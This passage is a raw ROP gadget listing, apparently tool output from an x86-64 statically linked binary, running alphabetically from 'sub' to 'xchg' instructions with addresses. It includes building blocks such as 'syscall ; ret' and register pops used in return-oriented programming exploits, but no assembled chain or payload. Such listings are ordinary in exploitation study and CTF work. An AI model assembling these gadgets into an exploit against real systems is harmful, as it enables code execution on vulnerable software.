0x0000000000423a87 : sub dword ptr [rdi + 0x10], ebx ; jb 0x423a9d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423bd7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x423bed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423d27 : sub dword ptr [rdi + 0x10], ebx ; jb 0x423d3d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423e77 : sub dword ptr [rdi + 0x10], ebx ; jb 0x423e8d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004201a3 : sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042019f : sub dword ptr [rdi - 0x20], esp ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000047c900 : sub dword ptr [rdi], -6 ; call qword ptr [rbx]
0x000000000042024d : sub dword ptr [rdi], esp ; jmp r9
0x000000000041681b : sub dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000041f946 : sub dword ptr [rip - 0xcfffffe], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret
0x000000000041e2b7 : sub eax, -1 ; jne 0x41e2c8 ; vzeroupper ; ret
0x000000000041564a : sub eax, 0x10 ; ret
0x000000000047d7b9 : sub eax, 0x2f30fffb ; sti ; call rax
0x0000000000456e57 : sub eax, 0x83000000 ; ret
0x00000000004676df : sub eax, 0x85ffffff ; sal byte ptr [rbp + 2], 0x5b ; ret
0x000000000043eec9 : sub eax, 0xd2310002 ; cmp ebx, eax ; setne dl ; jmp 0x43eebf
0x0000000000496c59 : sub eax, 0xe6740000 ; idiv edi ; ret 2
0x0000000000416882 : sub eax, 0xf480002 ; ret 0x66c3
0x0000000000448514 : sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x0000000000438d44 : sub eax, 1 ; ret
0x000000000046d106 : sub eax, dword ptr [0] ; ret
0x0000000000401c7f : sub eax, dword ptr [rbx + 8] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000044c685 : sub eax, dword ptr [rcx + 0xf] ; mov dh, 0x47 ; or al, 0x83 ; ret
0x000000000040f57e : sub eax, dword ptr [rdi + 0x18] ; ret
0x000000000043a9ea : sub eax, dword ptr [rdx + rcx*4] ; je 0x43a9d6 ; ret
0x00000000004169e2 : sub eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000040e9f3 : sub eax, dword ptr [rsi + 0x10] ; ret
0x0000000000438ead : sub eax, eax ; cmp eax, ecx ; jle 0x438ef1 ; movsxd rax, ecx ; ret
0x000000000046f281 : sub eax, eax ; mov dword ptr [rdx], eax ; mov eax, 2 ; ret
0x000000000046fdd3 : sub eax, eax ; ret
0x000000000041e303 : sub eax, ecx ; je 0x41e319 ; sbb eax, eax ; or eax, 1 ; ret
0x000000000040e0a9 : sub eax, ecx ; lea eax, [r8 - 1] ; ret
0x000000000046f1a0 : sub eax, ecx ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x0000000000417fac : sub eax, ecx ; ret
0x0000000000432e59 : sub eax, edi ; ret
0x0000000000460d9e : sub eax, edi ; shr rax, 2 ; ret
0x000000000040ea1b : sub eax, edx ; ret
0x0000000000461190 : sub eax, edx ; shr rax, 2 ; vzeroupper ; ret
0x000000000041e2cc : sub eax, edx ; vzeroupper ; ret
0x0000000000438f0d : sub eax, esi ; ret
0x00000000004009fe : sub ebp, dword ptr [rdx] ; jmp rax
0x000000000047b144 : sub ebp, dword ptr [rsi - 0x51d40008] ; clc ; call rbx
0x000000000049039e : sub ebp, eax ; fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x000000000040bb50 : sub ebp, eax ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040a4c6 : sub ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000048ee35 : sub ebx, dword ptr [rbx - 0xb] ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x000000000043e9c0 : sub ecx, dword ptr [rax - 0x75] ; push rax ; or dh, dh ; ret 0x8902
0x0000000000460334 : sub ecx, dword ptr [rcx + rcx*4 - 0x40] ; vzeroupper ; ret
0x0000000000494949 : sub edi, esi ; call qword ptr [rax]
0x000000000049495d : sub edi, esi ; call qword ptr [rdx]
0x000000000040ea20 : sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x000000000040ea15 : sub edx, dword ptr [rax + 0x18] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x0000000000447f9e : sub edx, dword ptr [rsp + 0x10] ; mov dword ptr [r12], edx ; jmp 0x447f73
0x000000000041d754 : sub edx, eax ; jbe 0x41d797 ; add rax, rdi ; ret
0x000000000041d764 : sub edx, eax ; jbe 0x41d799 ; lea rax, [rdi + rax + 0x10] ; ret
0x000000000041d774 : sub edx, eax ; jbe 0x41d799 ; lea rax, [rdi + rax + 0x20] ; ret
0x000000000041d784 : sub edx, eax ; jbe 0x41d799 ; lea rax, [rdi + rax + 0x30] ; ret
0x0000000000497769 : sub edx, edi ; call qword ptr [rbx]
0x0000000000497741 : sub edx, edi ; call qword ptr [rdx]
0x000000000040b2ff : sub edx, esi ; mov qword ptr [rsp], rcx ; mov rdi, rbx ; call rax
0x000000000047addd : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040eddf : sub qword ptr [r8], r8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040e0a8 : sub r8, rcx ; lea eax, [r8 - 1] ; ret
0x0000000000415649 : sub rax, 0x10 ; ret
0x0000000000438d43 : sub rax, 1 ; ret
0x000000000046d105 : sub rax, qword ptr [0] ; ret
0x000000000040f57d : sub rax, qword ptr [rdi + 0x18] ; ret
0x000000000046d104 : sub rax, qword ptr fs:[0] ; ret
0x000000000046fdd2 : sub rax, r8 ; ret
0x0000000000432e58 : sub rax, rdi ; ret
0x0000000000460d9d : sub rax, rdi ; shr rax, 2 ; ret
0x0000000000438e13 : sub rax, rdx ; ret
0x0000000000432eaf : sub rax, rdx ; vzeroupper ; ret
0x0000000000438f0c : sub rax, rsi ; ret
0x000000000041d753 : sub rdx, rax ; jbe 0x41d798 ; add rax, rdi ; ret
0x000000000047addc : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000043d9f7 : syscall ; pop rdx ; pop rsi ; ret
0x0000000000461645 : syscall ; ret
0x000000000040dddd : test al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040ae46 : test al, 0 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00000000004752b3 : test al, 0 ; add byte ptr [rax], al ; ret
0x0000000000472df4 : test al, 0x1d ; add byte ptr [rax], al ; mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x000000000048f6f7 : test al, 0x97 ; xchg eax, esp ; ret
0x000000000047cdd9 : test al, 0xfa ; call qword ptr [rax]
0x000000000047cdd5 : test al, 0xfa ; jmp qword ptr [rax + 0x10fffaa8]
0x000000000049d741 : test al, 0xfd ; call qword ptr [rbx]
0x000000000048d5c1 : test al, 0xfd ; jmp qword ptr [rax]
0x00000000004740c8 : test al, 3 ; jne 0x473ffa ; ret
0x000000000041826a : test al, al ; jne 0x418258 ; xor eax, eax ; sub eax, ecx ; ret
0x000000000046c8f6 : test al, al ; jne 0x46c8d3 ; movsx eax, dl ; neg eax ; ret
0x000000000047e1c4 : test al, bl ; sti ; call rsp
0x000000000044d0b6 : test bh, al ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x0000000000462448 : test bl, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044c140 : test bl, ch ; sbb eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x0000000000473368 : test bl, dl ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004082ef : test byte ptr [rax + rax - 0x76b80000], ch ; ret
0x00000000004654d4 : test byte ptr [rax + rax*4], ah ; add byte ptr [rax], al ; add cl, ch ; ret
0x00000000004067f7 : test byte ptr [rax - 0x77], 0xef ; mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000406fea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rbx]
0x00000000004703ca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rbx
0x000000000043708a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi] ; ret
0x00000000004364ca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x000000000040ed0a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x000000000040a90a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x000000000040961a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000040ecca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040deca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000436eca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x0000000000440ae2 : test byte ptr [rbp + rcx*4 + 0x3c], cl ; ret
0x000000000044d63c : test byte ptr [rbp - 0x7c000012], ah ; ret
0x00000000004582b4 : test byte ptr [rbp - 0x7c000017], ah ; ret
0x000000000040df26 : test byte ptr [rbx], 0x80 ; jne 0x40df56 ; pop rbx ; ret
0x00000000004763bb : test byte ptr [rcx + rax - 0x20], cl ; jmp rax
0x0000000000477f52 : test byte ptr [rcx + rcx*4 - 0x19], 0x41 ; call rdi
0x00000000004580d8 : test byte ptr [rcx - 0x7c000015], al ; ret
0x000000000043d56a : test byte ptr [rcx], al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004583ca : test byte ptr [rdi - 0x7c000018], cl ; ret
0x0000000000473cd4 : test byte ptr [rdi], 0x85 ; ret
0x000000000043c3cf : test byte ptr [rdi], 0x94 ; ret 0xc221
0x000000000043bee6 : test byte ptr [rdi], 0x94 ; ret 0xca21
0x0000000000454913 : test byte ptr [rdi], al ; add eax, dword ptr [rax] ; add dh, dh ; ret 0xf40
0x0000000000456f4c : test byte ptr [rip - 0x7c000003], cl ; ret
0x000000000045ffcd : test byte ptr [rsi + 0x48000000], bl ; bsf eax, edx ; ret
0x000000000043d525 : test byte ptr [rsi - 0x7d000000], dl ; ret
0x0000000000432d3d : test byte ptr [rsi], bh ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x00000000004743ba : test cl, cl ; add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x00000000004389cf : test cl, cl ; jne 0x4389c4 ; ret
0x0000000000438a7f : test cl, cl ; jne 0x438a74 ; ret
0x0000000000438d3f : test cl, cl ; jne 0x438d38 ; sub rax, 1 ; ret
0x000000000047d544 : test dh, 0xfa ; push qword ptr [rsi - 0x3a] ; cli ; jmp rsi
0x000000000043c950 : test dh, 1 ; jne 0x43c966 ; ret
0x0000000000414712 : test dh, bl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000442385 : test dh, dh ; mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x0000000000436f14 : test dl, 0x40 ; jne 0x436ed9 ; lea rax, [rdi + 7] ; ret
0x0000000000436f42 : test dl, 4 ; jne 0x436ed9 ; lea rax, [rdi + 3] ; ret
0x000000000046b539 : test dl, al ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0xd589
0x0000000000406266 : test dl, dl ; jne 0x406248 ; ret
0x0000000000438bef : test dl, dl ; jne 0x438be8 ; lea rax, [rcx - 1] ; ret
0x0000000000459020 : test dword ptr [rax - 0x16000005], esp ; ret 0xfffd
0x000000000045642f : test dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x000000000043f001 : test dword ptr [rax], eax ; add rax, rbp ; jmp rax
0x000000000044d091 : test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x0000000000456b36 : test dword ptr [rax], esi ; idiv edi ; dec dword ptr [rax - 0x39] ; ret 0x2c20
0x000000000043f000 : test dword ptr [rax], r8d ; add rax, rbp ; jmp rax
0x000000000044de1a : test dword ptr [rbp - 0x1600001b], ebp ; ret 0xffe6
0x000000000041d6d8 : test dword ptr [rbx + 0x31000000], esp ; rol bl, 0x83 ; ret 0x6620
0x000000000041f447 : test dword ptr [rbx + 7], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f896 : test dword ptr [rbx + rax], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041e518 : test dword ptr [rbx - 0x3a000003], esp ; std ; xlatb ; ret 0xe883
0x0000000000461d2b : test dword ptr [rcx + 0x48000000], edi ; add esp, 0x78 ; ret
0x000000000041f41d : test dword ptr [rcx + 7], esi ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f32d : test dword ptr [rcx + 8], esp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041f23d : test dword ptr [rcx + 9], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000478334 : test dword ptr [rdi + rdi*8 - 1], esi ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000402ab9 : test dword ptr [rdi], eax ; add byte ptr [rax - 0x77], cl ; ret 0xc031
0x000000000043bc72 : test dword ptr [rdi], edi ; add byte ptr [rax], al ; add rsp, 0x68 ; ret
0x000000000041f162 : test dword ptr [rdx + rcx], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000045fdb3 : test dword ptr [rip - 0x76ffffff], edi ; ret 0x8948
0x000000000043b866 : test dword ptr [rsi + 0x48000000], ebp ; add esp, 0x68 ; ret
0x0000000000438752 : test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000043deaf : test dword ptr [rsi + rdi*8 - 0x76bb0001], eax ; ret 0xc031
0x000000000044554e : test dword ptr [rsi + rdi*8 - 0x7cb70001], esi ; ret
0x0000000000407e7d : test dword ptr [rsi - 0x77000000], esp ; ret 0xe281
0x0000000000445ae5 : test dword ptr [rsi], edx ; add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000041f668 : test dword ptr [rsi], esp ; add eax, 0xc0310000 ; ret
0x00000000004913e0 : test eax, 0x7d4c8c5d ; ret 0xd8f
0x00000000004252e6 : test eax, 0x7f0f41f3 ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x000000000047cecd : test eax, 0xa942fffa ; cli ; call rdx
0x000000000047ce4d : test eax, 0xa956fffa ; cli ; jmp rsi
0x0000000000451784 : test eax, 0xf660003 ; outsd dx, dword ptr [rsi] ; ret 0x290f
0x00000000004517ad : test eax, 0xf660003 ; outsd dx, dword ptr [rsi] ; ret 0xb7e8
0x000000000043d89b : test eax, eax ; cmove eax, edx ; ret
0x000000000040040c : test eax, eax ; je 0x400416 ; call rax
0x00000000004155c1 : test eax, eax ; je 0x4155d8 ; lea rax, [rdx - 0x10] ; ret
0x000000000041d428 : test eax, eax ; je 0x41d434 ; xchg eax, edx ; sub eax, edx ; ret
0x000000000043c608 : test eax, eax ; je 0x43c613 ; ret
0x000000000043ee96 : test eax, eax ; je 0x43eea5 ; ret
0x0000000000448ddb : test eax, eax ; je 0x448de5 ; call rax
0x0000000000449d49 : test eax, eax ; je 0x449d53 ; call rax
0x000000000046fb90 : test eax, eax ; je 0x46fba8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004797f8 : test eax, eax ; je 0x479805 ; ret
0x0000000000479908 : test eax, eax ; je 0x479915 ; ret
0x000000000047a6d4 : test eax, eax ; je 0x47a6de ; call rax
0x000000000047a991 : test eax, eax ; je 0x47a9a0 ; call rax
0x000000000040dcfc : test eax, eax ; jne 0x40dcf5 ; ret
0x000000000040e9d4 : test eax, eax ; jne 0x40e9cd ; ret
0x000000000041d705 : test eax, eax ; jne 0x41d766 ; xor eax, eax ; ret
0x000000000041db81 : test eax, eax ; jne 0x41dba9 ; xor eax, eax ; vzeroupper ; ret
0x000000000043d9cf : test eax, eax ; jne 0x43d9cb ; pop rdx ; pop r10 ; ret
0x000000000045e900 : test eax, eax ; jne 0x45e8d0 ; xor eax, eax ; jmp 0x45e8d5
0x00000000004676e3 : test eax, eax ; jne 0x4676ee ; pop rbx ; ret
0x0000000000479837 : test eax, eax ; jne 0x479845 ; ret
0x0000000000479852 : test eax, eax ; jne 0x479865 ; ret
0x0000000000479a82 : test eax, eax ; jne 0x479a95 ; ret
0x0000000000467780 : test eax, eax ; js 0x467797 ; pop rbx ; ret
0x00000000004593df : test eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x0000000000464753 : test eax, ebx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000457531 : test eax, esi ; idiv bh ; jmp qword ptr [rax]
0x000000000047aa1b : test ebp, ebp ; jne 0x47aa08 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041d640 : test ebx, ebx ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x0000000000436f02 : test ecx, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x0000000000460e79 : test ecx, ecx ; jne 0x460e38 ; mov rax, rdx ; ret
0x000000000046231f : test ecx, ecx ; jne 0x462375 ; ret
0x0000000000462390 : test ecx, ecx ; jne 0x462382 ; ret
0x0000000000468323 : test edi, edi ; jne 0x46832d ; call rax
0x0000000000468323 : test edi, edi ; jne 0x468331 ; call rax
0x000000000046ae7a : test edi, edi ; jne 0x46ae55 ; ret
0x000000000046f35d : test edi, edi ; mov byte ptr [rsi], al ; jne 0x46f351 ; mov rax, rsi ; ret
0x0000000000432cf2 : test edx, edx ; je 0x432d00 ; bsf eax, edx ; ret
0x0000000000432cf2 : test edx, edx ; je 0x432d01 ; bsf eax, edx ; ret
0x0000000000432d9b : test edx, edx ; je 0x432db7 ; bsf rax, rdx ; ret
0x0000000000432d9b : test edx, edx ; je 0x432db8 ; bsf rax, rdx ; ret
0x000000000043e1da : test edx, edx ; je 0x43e1f1 ; lea rdi, [rcx + rax + 0x20] ; jmp rdx
0x000000000046003a : test edx, edx ; je 0x460067 ; bsf rax, rdx ; ret
0x000000000046003a : test edx, edx ; je 0x460068 ; bsf rax, rdx ; ret
0x000000000040c051 : test edx, edx ; jne 0x40c066 ; xor eax, eax ; ret
0x000000000040d2df : test edx, edx ; jne 0x40d2d5 ; ret
0x000000000045dabf : test edx, edx ; jne 0x45dab5 ; ret
0x0000000000460bda : test edx, edx ; jne 0x460bd5 ; ret
0x000000000047aae9 : test edx, edx ; jne 0x47aaf5 ; ret
0x0000000000436ef5 : test esi, edx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x0000000000448ce0 : test esi, esi ; je 0x448cea ; call rsi
0x000000000045ff31 : test esi, esi ; jne 0x45ff40 ; xor rax, rax ; ret
0x0000000000460be1 : test esi, esi ; jne 0x460bf0 ; xor rax, rax ; ret
0x000000000044ce03 : test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x0000000000436f0f : test esp, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x000000000041d427 : test r8d, r8d ; je 0x41d435 ; xchg eax, edx ; sub eax, edx ; ret
0x0000000000460e78 : test r9d, r9d ; jne 0x460e39 ; mov rax, rdx ; ret
0x000000000040040b : test rax, rax ; je 0x400417 ; call rax
0x00000000004155c0 : test rax, rax ; je 0x4155d9 ; lea rax, [rdx - 0x10] ; ret
0x000000000043c607 : test rax, rax ; je 0x43c614 ; ret
0x0000000000448dda : test rax, rax ; je 0x448de6 ; call rax
0x0000000000449d48 : test rax, rax ; je 0x449d54 ; call rax
0x000000000046fb8f : test rax, rax ; je 0x46fba9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000047a6d3 : test rax, rax ; je 0x47a6df ; call rax
0x000000000047a990 : test rax, rax ; je 0x47a9a1 ; call rax
0x000000000040dcfb : test rax, rax ; jne 0x40dcf6 ; ret
0x000000000040e9d3 : test rax, rax ; jne 0x40e9ce ; ret
0x000000000047aa1a : test rbp, rbp ; jne 0x47aa09 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046ae79 : test rdi, rdi ; jne 0x46ae56 ; ret
0x0000000000432d9a : test rdx, rdx ; je 0x432db8 ; bsf rax, rdx ; ret
0x0000000000432d9a : test rdx, rdx ; je 0x432db9 ; bsf rax, rdx ; ret
0x0000000000460039 : test rdx, rdx ; je 0x460068 ; bsf rax, rdx ; ret
0x0000000000460039 : test rdx, rdx ; je 0x460069 ; bsf rax, rdx ; ret
0x000000000040c050 : test rdx, rdx ; jne 0x40c067 ; xor eax, eax ; ret
0x000000000040d2de : test rdx, rdx ; jne 0x40d2d6 ; ret
0x000000000045dabe : test rdx, rdx ; jne 0x45dab6 ; ret
0x000000000047aae8 : test rdx, rdx ; jne 0x47aaf6 ; ret
0x0000000000448cdf : test rsi, rsi ; je 0x448ceb ; call rsi
0x000000000045ff30 : test rsi, rsi ; jne 0x45ff41 ; xor rax, rax ; ret
0x0000000000460be0 : test rsi, rsi ; jne 0x460bf1 ; xor rax, rax ; ret
0x000000000043c94f : test sil, 1 ; jne 0x43c967 ; ret
0x000000000040c853 : vminsd xmm8, xmm4, qword ptr [rcx + 0x5c] ; ret
0x000000000042a8aa : vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x000000000043965c : vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000439025 : vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x000000000043a1e1 : vmovdqu xmmword ptr [rdi], xmm0 ; vzeroupper ; ret
0x0000000000439029 : vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00000000004397e8 : vmovdqu ymmword ptr [r11], ymm4 ; vzeroupper ; ret
0x000000000043988f : vmovdqu ymmword ptr [r11], ymm8 ; vzeroupper ; ret
0x000000000042a896 : vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x000000000042a87d : vmovdqu ymmword ptr [r9 - 0x20], ymm3 ; ret
0x00000000004395c5 : vmovdqu ymmword ptr [rdi + rdx - 0x20], ymm1 ; vzeroupper ; ret
0x000000000043a14b : vmovdqu ymmword ptr [rdi + rdx - 0x40], ymm0 ; vzeroupper ; ret
0x0000000000439733 : vmovdqu ymmword ptr [rdi + rdx - 0x40], ymm3 ; vzeroupper ; ret
0x0000000000439705 : vmovdqu ymmword ptr [rdi + rdx - 0x80], ymm7 ; vzeroupper ; ret
0x000000000043a0d2 : vmovdqu ymmword ptr [rdi], ymm0 ; vzeroupper ; ret
0x000000000043901b : vmovdqu ymmword ptr [rdi], ymm2 ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x000000000043901f : vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x0000000000439ca2 : vmovdqu64 zmmword ptr [r11], zmm4 ; vzeroupper ; ret
0x0000000000439d68 : vmovdqu64 zmmword ptr [r11], zmm8 ; vzeroupper ; ret
0x000000000043a25d : vmovdqu64 zmmword ptr [rdi], zmm0 ; vzeroupper ; ret
0x0000000000439034 : vmovq qword ptr [rdi], xmm0 ; vmovq qword ptr [rsi - 8], xmm0 ; ret
0x0000000000439038 : vmovq qword ptr [rsi - 8], xmm0 ; ret
0x000000000042abb3 : vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x000000000042aa4c : vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x000000000042a84e : vmovups zmmword ptr [r9 - 0x40], zmm3 ; ret
0x000000000042a812 : vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x000000000042ad15 : vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00000000004391d8 : vmovups zmmword ptr [rsi + 0x1c0], zmm2 ; ret
0x000000000043913b : vmovups zmmword ptr [rsi + 0xc0], zmm2 ; ret
0x0000000000438fda : vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x0000000000430ef1 : vpcmpeqb xmm0, xmm0, xmm1 ; lea r10, [r10 + r9] ; jmp r10
0x000000000041da28 : vzeroupper ; ret
0x000000000041dc00 : vzeroupper ; xor eax, eax ; ret
0x000000000040f5f5 : wait ; sub dword ptr [r8], r8d ; ret
0x000000000041ca73 : xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000043019f : xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041cb63 : xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041c983 : xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000044e717 : xchg al, bl ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x0000000000431dec : xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x000000000043160c : xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x00000000004319fc : xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043121c : xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000046925c : xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000043a462 : xchg byte ptr [rax + 1], cl ; int1 ; jmp rcx
0x000000000041d3cb : xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x0000000000430cff : xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004304df : xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x000000000042fcbf : xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x000000000041cf23 : xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x000000000049c579 : xchg byte ptr [rax], al ; add byte ptr [rax - 3], dh ; call rdi
0x00000000004313bb : xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043081f : xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c6b3 : xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x000000000042ffff : xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042f7df : xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x00000000004309bf : xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x000000000041d103 : xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041c893 : xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x0000000000476cbc : xchg byte ptr [rcx + rax - 0x10], cl ; jmp rax
0x000000000041d2e3 : xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000468eab : xchg byte ptr [rdi + 2], cl ; add cl, ch ; ret
0x00000000004318ac : xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004310cc : xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004321dc : xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041d1f3 : xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042fb1f : xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041cb35 : xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041cc25 : xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041ca45 : xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000406b03 : xchg byte ptr [rsi + rdi*8 + 0x158bffff], dl ; ret 0x29cd
0x000000000042fc55 : xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430955 : xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430475 : xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004317ad : xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
